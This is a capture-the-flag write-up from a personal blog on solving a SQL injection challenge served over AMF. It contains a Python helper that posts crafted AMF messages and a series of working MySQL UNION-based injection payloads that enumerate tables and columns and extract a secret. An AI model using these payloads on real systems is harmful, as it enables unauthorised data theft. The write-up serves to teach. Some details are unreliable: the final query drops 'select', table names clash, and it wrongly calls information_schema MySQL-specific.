@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Weirdo (SQLi writeup - EKO 2019)</title>
+  <meta name="description" content="Quick writeup of a SQL injection challenge.">
+
+  
+    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
+  
+
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        extensions: ["tex2jax.js"],
+        jax: ["input/TeX","output/HTML-CSS"],
+        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
+	TeX: {
+	  Macros: {
+            
+	  }
+	}
+      });
+    </script>
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
+    
+  
+
+  
+    <script
+       src="https://code.jquery.com/jquery-3.4.1.min.js"
+       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+       crossorigin="anonymous"></script>
+  
+
+  
+
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
+    
+
+    
+      <script src="https://d3js.org/d3.v4.min.js"></script>
+    
+
+    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
+    <script src='/book-of-gehn/js/venn/helper.js'></script>
+
+    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">
+
+  <link rel="canonical" href="/book-of-gehn/articles/2019/09/29/Writeup-EKO2019-Weirdo.html">
+
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">
+
+  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
+</head>
+
+  <body>
+    <header>
+	
+		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
+		
+		
+	
+
+    
+
+    
+</header>
+
+    <article class="group">
+      <h1>Weirdo (SQLi writeup - EKO 2019)</h1>
+<p class="subtitle">September 29, 2019</p>
+
+<p>Quick writeup of a SQL injection challenge.</p>
+
+<!--more-->
+<p>We start with a
+<a href="/book-of-gehn/assets/eko2019-writeups/weiro-dir/wtf.pcap">pcap</a>
+of a HTTP communication between a client and a server.</p>
+
+<p>It is only one request/response.</p>
+
+<p>With <code class="highlighter-rouge">wireshark</code> we can see that the parties are talking using
+<a href="https://en.wikipedia.org/wiki/Action_Message_Format">AMF</a></p>
+
+<p>Here is the decoded <code class="highlighter-rouge">POST</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hypertext Transfer Protocol
+    POST / HTTP/1.1
+    Content-type: application/x-amf
+    Content-Length: 40
+Action Message Format
+    AMF version: 0
+    Header count: 0
+    Message count: 1
+    Messages
+        Target URI: EKO.CTF
+        Response URI: /1
+        Length: Unknown
+        ECMA array (1 items)
+            AMF0 type: ECMA array (0x08)
+            Array length: 0
+            Property 'q' String 'arg'
+                Name: q
+                    String length: 1
+                    String: q
+                String 'arg'
+                    AMF0 type: String (0x02)
+                    String length: 3
+                    String: arg
+            End Of Object Marker
+</code></pre></div></div>
+
+<h3 id="brief-amf-disassemble">Brief AMF Disassemble</h3>
+
+<p>In particular, this is the hexdump of the AMF message:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000   00 00 00 00 00 01 00 07 45 4b 4f 2e 43 54 46 00
+0010   02 2f 31 ff ff ff ff 08 00 00 00 00 00 01 71 02
+0020   00 03 61 72 67 00 00 09
+</code></pre></div></div>
+
+<p>From the end to the begin, the <code class="highlighter-rouge">00 00 09</code> is the
+<code class="highlighter-rouge">End of Object Marker</code>, <code class="highlighter-rouge">02 00 03 61 72 67</code> is the
+<code class="highlighter-rouge">arg</code> string, in ASCII prefixed with 2 bytes that
+determines its length in big endian and all of that is
+prefixed with on byte, <code class="highlighter-rouge">02</code> that says what follows is
+a string.</p>
+
+<p>I’m going to stop here as my understanding of AMF is quite
+low and it deserves a separate post.</p>
+
+<p>Playing with the value of the query, this <code class="highlighter-rouge">arg</code>, is all
+what we need to get some fun.</p>
+
+<p>Replacing <code class="highlighter-rouge">arg</code> with <code class="highlighter-rouge">'xx</code> we get a database error showing
+that the server is vulnerable to a SQL injection.</p>
+
+<p>So you know what I’m talking about.</p>
+
+<h3 id="custom-queries">Custom Queries</h3>
+
+<p>Before playing, we need a simple way to submit custom queries.</p>
+
+<p>We treat the AMF message as an opaque string, the only thing
+that we need is to inject an arbitrary string <code class="highlighter-rouge">q</code> prefixed
+with its size.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">cryptonita</span> <span class="kn">import</span> <span class="n">B</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="n">hdr</span> <span class="o">=</span> <span class="s">'''
+... 00 00 00 00 00 01 00 07 45 4b 4f 2e 43 54 46 00
+... 02 2f 31 ff ff ff ff 08 00 00 00 00 00 01 71 02
+... '''</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="n">hdr</span> <span class="o">=</span> <span class="n">B</span><span class="p">(</span><span class="n">hdr</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">eom</span> <span class="o">=</span>  <span class="n">B</span><span class="p">(</span><span class="s">'00 00 09'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">q</span><span class="p">):</span>
+<span class="o">...</span>     <span class="n">q</span>  <span class="o">=</span> <span class="n">B</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>
+<span class="o">...</span>     <span class="n">sz</span> <span class="o">=</span> <span class="n">B</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">q</span><span class="p">))</span>
+<span class="o">...</span>
+<span class="o">...</span>     <span class="n">sz</span> <span class="o">=</span> <span class="n">sz</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&gt;H'</span><span class="p">)</span> <span class="c1"># uint16, big endian
+</span><span class="o">...</span>     <span class="k">return</span> <span class="n">hdr</span> <span class="o">+</span> <span class="n">sz</span> <span class="o">+</span> <span class="n">q</span> <span class="o">+</span> <span class="n">eom</span>
+</code></pre></div></div>
+
+<p>We wrap this into a HTTP POST.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="n">q</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s">'https://wtf.eko.cap.tf/'</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">b</span><span class="s">'network'</span><span class="p">):</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="n">B</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunk</span> <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">isprintable</span><span class="p">()])</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The response is also a AMF message that we treat it as a binary blob.</p>
+
+<p>For this reason we arbitrary split the response in chunks and we
+filter out any non-printable char.</p>
+
+<p>And <em>voila!</em> With <code class="highlighter-rouge">post</code> we can submit arbitrary queries and see their
+responses.</p>
+
+<h3 id="prologue-and-epilogue">Prologue and Epilogue</h3>
+
+<p>We know that we are injecting in the middle of a SQL query but
+we don’t know <em>where</em>.</p>
+
+<p>We may be injecting here</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='&lt;here&gt;' ;
+</code></pre></div></div>
+
+<p>but we may be injected here:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ??? in (select ??? from ??? where ???='&lt;here&gt;' ???);
+</code></pre></div></div>
+
+<p>The possibilities are infinite.</p>
+
+<p>If we <em>assume</em> the first case, we could try this:</p>
+
+<ul>
+  <li>a <em>prologue</em> of <code class="highlighter-rouge">'</code> to close the left side of the query</li>
+  <li>a <em>epilogue</em> of <code class="highlighter-rouge">; --</code> to close the statement and ignore anything
+on the right.</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; q = b"'; --"
+</code></pre></div></div>
+
+<p>The idea is that we transform the <em>host</em> query</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='&lt;here&gt;';
+</code></pre></div></div>
+
+<p>into this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???=''; --';
+</code></pre></div></div>
+
+<p>But we were wrong. It failed.</p>
+
+<p>Perhaps we are in the wrong spot, perhaps one of our injected characters
+were filtered or our prologue and/or epilogue is wrong.</p>
+
+<p>The <code class="highlighter-rouge">--</code> begins a comment. Each SQL engine has its own. The <code class="highlighter-rouge">--</code> works
+in Oracle and under <em>some</em> conditions in MySQL.</p>
+
+<p>The <code class="highlighter-rouge">#</code> works only in MySQL without any condition so we could try that:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"'; #"</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???=''; #';
+</code></pre></div></div>
+
+<p>And it worked! And we learnt that the database is a MySQL for free.</p>
+
+<p><a href="http://www.sqlinjection.net/comments/">Ref</a></p>
+
+<h3 id="deducing-the-host-query-structure">Deducing the Host Query Structure</h3>
+
+<p>Under the hypothetical host query:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='&lt;here&gt;';
+</code></pre></div></div>
+
+<p>We could learn how many <em>columns</em> is using the <code class="highlighter-rouge">select</code> making the
+query to order the results by the, let’s say, the 10th column.</p>
+
+<p>If it fails we now that it has less than 10 columns.</p>
+
+<p>After some binary search, we learn that it has 5 columns:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' order by 5 ;#"</span>    <span class="c1"># 5 columns
+</span></code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select c1, c2, c3, c4, c5 from ??? where ???='' order by 5 ; #';
+</code></pre></div></div>
+
+<p>We can experiment further with:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' union select 99, 98, 97, 96, 95 from information_schema.tables ;#"</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='' union select 99, 98, 97, 96, 95 from information_schema.tables ;#';
+</code></pre></div></div>
+
+<p>This also validates that the database engine is a MySQL (<code class="highlighter-rouge">information_schema</code>
+is MySQL specific) and that we can <em>union</em> the results.</p>
+
+<p>The last confirms that the host query is just a <code class="highlighter-rouge">select</code> and we are
+injecting in the <code class="highlighter-rouge">where</code> clause.</p>
+
+<h3 id="information-gathering">Information Gathering</h3>
+
+<p>With this we can learn what other tables are in the database:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' and 1=0 union select 99, table_name, 97, 96, 95 from information_schema.tables ;#"</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='' and 1=0 union select 99, table_name, 97, 96, 95 from information_schema.tables ;#';
+</code></pre></div></div>
+
+<p>And with this one we can learn what columns has the table <code class="highlighter-rouge">secret</code>, table that
+found with the previous query and it has a interesting name.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' and 1=0 union select 99, column_name, 97, 96, 95 from information_schema.columns where table_name='secret' ;#"</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='' and 1=0 union select 99, column_name, 97, 96, 95 from information_schema.columns where table_name='secret' ;#';
+</code></pre></div></div>
+
+<p>In both cases the <code class="highlighter-rouge">and 1=0</code> makes the <em>host</em> query to produce zero results
+and it makes the output much cleaner.</p>
+
+<h3 id="profit">Profit!</h3>
+
+<p>Finally:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' and 1=0 union 99, secret, 97, 96, 95 FROM secrets ;#"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">post</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>
+<span class="o">&lt;...&gt;</span>
+<span class="n">EKO</span><span class="p">{</span> <span class="n">this</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">flag</span> <span class="p">}</span>
+<span class="o">&lt;...&gt;</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='' and 1=0 union 99, secret, 97, 96, 95 FROM secrets ;#';
+</code></pre></div></div>
+
+
+
+    </article>
+    <span class="print-footer">Weirdo (SQLi writeup - EKO 2019) - September 29, 2019 - Gehn</span>
+    <footer>
+    <hr class="slender">
+    <div class="credits">
+        <span>&copy; 2021
+            
+            Gehn
+        </span></br>
+            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
+        <br>
+        
+
+    
+    </div>
+</footer>
+
+  </body>
+</html>
